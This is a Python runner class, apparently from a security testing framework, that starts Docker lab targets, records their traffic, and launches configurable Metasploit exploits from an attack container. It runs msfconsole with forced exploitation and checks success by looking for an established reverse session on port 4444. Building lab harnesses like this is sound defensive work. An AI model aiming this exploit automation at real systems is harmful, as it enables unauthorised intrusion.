from python_on_whales import DockerClient
import time
from runners.base import BaseRunner
import os
"""
A config will have the following:
- client - for interacting with network and volume
- yml file
- target name
- msf_exploit
- msf_options
"""


class DockerComposeMsfCli(BaseRunner):
    def __init__(self, docker_client, vuln_name="", target_name="target", 
                 network_name="set_framework_net", volume_name="set_logs", 
                 target_yml="", msf_exploit="", msf_options="", delay=0):
        super().__init__(docker_client, network_name, volume_name)
        self.vuln_name = vuln_name
        self.target_yml=os.path.expandvars(target_yml)
        self.target_name=target_name
        self.msf_exploit=msf_exploit
        self.msf_options=msf_options
        self.delay=delay

        self.setc_yml = os.path.expandvars("$SETC_PATH/example_configurations/compose_examples/yml/setc-net_docker-compose.yml")
        self.wdocker = None
        self.tcpdump_instances = []
        self.attack=None
        self.target_logs=None

 
    def target_setup(self):
        wdocker = DockerClient(compose_project_name="setc", compose_files=[self.target_yml, self.setc_yml])
        wdocker.compose.build()
        wdocker.compose.up(detach=True)
        self.wdocker = wdocker

    def target_cleanup(self):
        if self.tcpdump_instances:
            self.tcpdump_cleanup()
        self.wdocker.compose.stop()
        self.wdocker.compose.rm()

    def tcpdump_setup(self):
        tcpdump_instances = []
        for i in self.wdocker.compose.ps():
            #TODO: parse pcaps for all compose instances. For now, we are only parsing the target instance
            if i.name == self.target_name:
                #TODO: fix this with named arguments
                cmd = "-U -v -w /data/%s/pcap/%s.pcap" % (self.vuln_name, self.vuln_name)
                dk_tcpdump = self.client.containers.run("tcpdump",command=cmd, detach=True,
                                  name="%s-tcpdump" % self.target_name, privileged=True,
                                  network="container:%s" % self.target_name, #TODO: this should be derived from self.target.name
                                  volumes={self.volume:{"bind":"/data","mode":'rw'}})
                tcpdump_instances.append(dk_tcpdump)
        self.tcpdump_instances = tcpdump_instances

    def tcpdump_cleanup(self):
        for instance in self.tcpdump_instances:
            instance.stop()
            instance.remove()

    def attack_setup(self):
        print("[*] Starting attack system for %s" % self.target_name)
        dk_attack = self.client.containers.run("metasploitframework/metasploit-framework:6.2.33",
                                 detach=True, name="%s-attack" % self.target_name,
                                 network=self.network, tty=True)
        self.attack=dk_attack

    def attack_cleanup(self):
        self.attack.stop()
        self.attack.remove()

    def exploit(self):
        cmd = "/usr/src/metasploit-framework/msfconsole"
        flag = "-x"
        args = """use %s; %s \
            set RHOSTS %s; \
            set LHOST %s; \
            set ForceExploit true; \
            set AutoCheck false; \
            set ExitOnSession false; \
            exploit"""
        #cant remember why the second arg is a blank string
        print("[*] Running exploit for %s" % self.target_name, end="", flush=True)
        args = args % (self.msf_exploit, self.msf_options, self.target_name, "%s-attack" % self.target_name)
        result = self.attack.exec_run(cmd=[cmd, flag, args], tty=True, detach=True)

    def exploit_success(self):
        cmd = "netstat |grep 4444 |grep ESTABLISHED"
        result = self.attack.exec_run(cmd=cmd, tty=True)
        cmd_result = str(result.output)
        print('.', end="", flush=True)
        for line in cmd_result.splitlines():
            if "4444" in str(line) and "ESTABLISHED" in str(line):
                print("\n[*] Exploit of %s success" % self.target_name)
                return True
        return False

    def ready_to_exploit(self):
         #TODO: add a delay and retries argument similar to exploit_intil_success
        if self.target_logs == None:
            print("[*] Checking if target %s is setup" % self.target_name, end="",
                  flush=True)
        else:
            print('.', end="", flush=True)
        #temp solution
        target = self.client.containers.get(self.target_name)  
        logs = target.logs()
        if self.target_logs == logs:
            print("\n[*] Target %s is ready for exploit" % self.target_name)
            return True
        else:
            self.target_logs = logs
            time.sleep(5)
        return False
